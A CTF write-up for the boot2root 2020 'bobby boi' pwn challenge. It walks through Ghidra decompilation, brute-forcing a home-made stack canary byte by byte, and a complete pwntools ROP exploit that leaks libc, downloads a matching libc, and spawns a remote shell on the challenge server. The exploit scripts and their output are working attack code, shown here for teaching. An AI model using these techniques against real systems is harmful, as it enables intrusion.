# boot2root 2020

## bobby boi

> 493
>
> My boi bobby claims to be the new MC, do you have the bars to defeat him in a rap battle? Bobby will need the length of your bars beforehand tho.
> 
> `nc 35.238.225.156 1002`
>
> Author: Viper_S
> 
> [bobbi_boi](bobbi_boi)

Tags: _pwn_ _x86-64_ _remote-shell_ _bof_ _rop_


## Summary

ROP with faux canary brute-forced.
 

## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE, no canary; easy BOF, easy ROP.


### Decompile with Ghidra

> This binary has been stripped of symbols; I added the `read_og_bars` and `main` labels myself in Ghidra.

```c
void read_og_bars(void)
{
  FILE *__stream;
  
  __stream = fopen("og_bars.txt","r");
  if (__stream == (FILE *)0x0) {
    puts("The OG bars are missing, either run the binary on the server or contact admin.");
    exit(0);
  }
  fread(&DAT_004040a0,1,8,__stream);
  fclose(__stream);
  return;
}
```

`main` (not shown) first calls `read_og_bars`, that basically reads 8 bytes from a file called `og_bars.txt` into a global variable `DAT_004040a0`.


```c
void vuln(void)
{
  int iVar1;
  int local_5c;
  char local_58 [32];
  char local_38 [36];
  undefined8 local_14;
  int local_c;
  
  local_c = 0;
  local_14 = DAT_004040a0;
  puts("Can you defeat bobby in a rap battle?\n");
  puts("What\'s the size of your bars?");
  while ((local_c < 0x20 && (read(0,local_58 + local_c,1), local_58[local_c] != '\n'))) {
    local_c = local_c + 1;
  }
  __isoc99_sscanf(local_58,&DAT_004020ad,&local_5c);
  puts("Spit your bars here: ");
  read(0,local_38,(long)local_5c);
  gets(local_38);
  iVar1 = memcmp(&local_14,&DAT_004040a0,8);
  if (iVar1 == 0) {
    fflush(stdout);
    return;
  }
  puts("*** Stack Smashing Detected ***: The og bars were tampered with.");
  exit(-1);
}
```

Next, `main` calls `vuln`.

At the start `local_14` is set from `DAT_004040a0` that was set from `read_og_bars`, IOW, `local_14` is set to the 8 bytes from the file `og_bars.txt`.

`local_14` is a home brew canary, and is checked with `memcmp`, if `local_14` is molested in any way, then `return` will not be reached and any hope of a ROP chain dashed.

Since there is no canary leak, we'll have to brute force.

The first prompt `What's the size of your bars?`, sets `local_5c`, which is used by `read` to read that many bytes into `local_38`; clearly this can be exploited for an overflow if `local_14` is known.

Following the `read` is a `gets` that also reads into `local_38`.  I can only imagine the challenge author put this there so that it can be used to catch a newline, which is unnecessary, but makes the challenge easier? Perhaps to avoid _n00brage_?

> This is not an uncommon pattern with brute forcing canaries, base process addresses, etc..., however pwntools `send` vs. `sendline` can be use with `read(0,buff,larger_number)`--the `gets` to catch a newline is not required.

Since the faux canary is read from a file, that we can assume is static, then brute forcing is a simple pattern of inputing to `What's the size of your bars?` a size one greater than `0x38 - 0x14` (distance from `local_38` (read buffer) to `local_14` faux canary) and testing that one byte overflow until we do NOT get a `*** Stack Smashing Detected ***` detected message, then increase overflow by one, add discovered byte to payload, and repeat until all 8 bytes have been discovered:

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./bobby_boi')
context.log_level = 'WARN'

canary = b''
for i in range(8):
    for j in range(256):
        if args.REMOTE:
            p = remote('35.238.225.156', 1002)
        else:
            p = process(binary.path)
        p.sendlineafter('your bars?\n',str((0x38 - 0x14) + i + 1))
        payload  = (0x38 - 0x14) * b'0'
        payload += canary
        payload += chr(j).encode()
        p.sendlineafter('bars here: \n', payload)
        try:
            if b'Stack Smashing Detected' in p.recvline():
                p.close()
                continue
        except:
            canary += chr(j).encode()
            log.warn('canary: ' + canary.decode())
            p.close()
            break

sys.exit(0)
```

Output:

```bash
# time ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/bobby_boi/bobby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[!] canary: -
[!] canary: -V
[!] canary: -V1
[!] canary: -V1p
[!] canary: -V1p3
[!] canary: -V1p3R
[!] canary: -V1p3R_
[!] canary: -V1p3R_$
./exploit.py REMOTE=1  1.88s user 0.44s system 1% cpu 2:48.18 total
```

Locally this runs in about 3-4 seconds, remotely this took almost 3 minutes.

> If I had assumed only printable ASCII, then it would have taken 1/2 the time.  Since this worked fine the first time and I had the canary I didn't any reason to change the code.
> 
> When developing locally I created an `og_bars.txt` file with `ABCDEFGH` for testing.

Now that we have the canary, the rest is nearly identical to [canned](https://github.com/datajerk/ctf-write-ups/tree/master/boot2root2020/canned), if you haven't already, pause here and read that.

> Read [blind-piloting](https://github.com/datajerk/ctf-write-ups/tree/master/b01lersctf2020/blind-piloting) for a lengthly example of brute-forcing the stack canary, then the base process address 4th least significant nibble, followed by the rest of the base process address.  This was my first brute-forcing experience and it took me 3 days past the end of the CTF to figure out.  Another good example is [ripe_reader](https://github.com/datajerk/ctf-write-ups/blob/master/nahamconctf2020/ripe_reader/README.md)

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./bobby_boi')
context.log_level = 'WARN'

binary.symbols['vuln'] = 0x0040124a
canary = b'-V1p3R_$'
libc_index = 0

while True:
```

[Most of] these CTFs require that you figure out the remote libc version and download it for your exploits.  It gets really old, so I automated it.  The `libc_index = 0` gets incremented if the _guessed_ libc fails to spawn a shell.  The `while True:` is the main loop that _tries_ each _guessed_ version of libc, usually the first one is correct.

The line `binary.symbols['vuln'] = 0x0040124a` adds a symbol to the symbol table so that I can reference this address by name--this binary was stripped.

`canary` is set to the value we already brute forced.

```python
    if args.REMOTE:
        p = remote('35.238.225.156', 1002)
    else:
        p = process(binary.path)
        libc = binary.libc

    context.log_level = 'INFO'

    rop = ROP([binary])
    pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]

    # first pass, get libc
    payload  = b''
    payload += (0x38 - 0x14) * b'0'
    payload += canary
    payload += (0x38 - len(payload)) * b'A'
    payload += p64(pop_rdi)
    payload += p64(binary.got.puts)
    payload += p64(binary.plt.puts)
    payload += p64(binary.sym.vuln)

    p.sendlineafter('your bars?\n',str(len(payload)))
    p.sendlineafter('bars here: \n', payload)

    _ = p.recv(6)
    puts = u64(_ + b'\0\0')
    log.info('puts: ' + hex(puts))
```

Above is the first pass.  After leaking the canary, we write out some garbage (`0x38 - 0x14` is the distance between `local_38` (from `read`) and the faux canary (`local_14`)), followed by the canary, then garbage to the return address (`local_38` is `0x38` bytes from the return address, the total payload should be `0x38` in length at this point).

With the padding and canary bypass in place, we have `puts` leak itself, then loop back to `vuln` while capturing the `puts` address.

```python
    if not 'libc' in locals():
        import requests
        r = requests.post('https://libc.rip/api/find', json = {'symbols':{'puts':hex(puts)[-3:]}})
        while True:
            libc_url = r.json()[libc_index]['download_url']
            if context.arch in libc_url:
                break
            libc_index += 1
        log.info('libc_url: ' + libc_url)
        libc_file = libc_url.split('/')[-1:][0]
        if not os.path.exists(libc_file):
            log.info('getting: ' + libc_url)
            r = requests.get(libc_url, allow_redirects=True)
            open(libc_file,'wb').write(r.content)
        libc = ELF(libc_file)
```

Above is the lazy pass.  This will take the leaked `puts` least significant three nibbles and try to find a match using the libc-database [online](https://libc.rip)--These guys are are the best!  _Thanks for the API!_

If the arch is not a match, then It'll try the next; when there is a match, the libc is downloaded and setup as the candidate libc to test for a shell.

```python
    libc.address = puts - libc.sym.puts
    log.info('libc.address: ' + hex(libc.address))

    # 2nd pass, get shell
    payload  = b''
    payload += (0x38 - 0x14) * b'0'
    payload += canary
    payload += (0x38 - len(payload)) * b'A'
    payload += p64(pop_rdi + 1)
    payload += p64(pop_rdi)
    payload += p64(libc.search(b'/bin/sh').__next__())
    payload += p64(libc.sym.system)

    p.sendlineafter('your bars?\n',str(len(payload)))
    p.sendlineafter('bars here: \n', payload)

    try:
        time.sleep(1)
        p.sendline('echo shell')
        if b'shell' in p.recvline():
            p.interactive()
            break
    except:
        libc_index += 1
        p.close()
```

Above is the second pass.  This will compute the base of libc and use the same bypass payload as before however this time will use libc to get a shell.

The `try` block will do an `echo` test for a shell, if that fails, then back to the top, and the next libc candidate will be tested until we get a shell (works every time :-).

> `pop_rdi+1` is the same as `ret` and is used to align the stack, otherwise `system` would segfault (see [blind-piloting](https://github.com/datajerk/ctf-write-ups/tree/master/b01lersctf2020/blind-piloting) and search for stack-alignment).  The next instruction will pop the address of `/bin/sh` into `rdi` (required for `system`). Lastly, `system` is called.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/boot2root2020/bobby_boi/bobby_boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './bobby_boi'
[*] puts: 0x7fefaaaee6a0
[*] libc_url: https://libc.rip/download/libc6_2.23-0ubuntu11.2_amd64.so
[*] getting: https://libc.rip/download/libc6_2.23-0ubuntu11.2_amd64.so
[*] '/pwd/datajerk/boot2root2020/bobby_boi/libc6_2.23-0ubuntu11.2_amd64.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fefaaa7f000
[*] Switching to interactive mode
$ cat flag
b00t2root{y3Ah_Ye4h_b0bbY_b0y_H3_B3_f33l1n_H1m5elf_SG9taWNpZGU=}
```

> Notice above the detection and download of the challenge libc.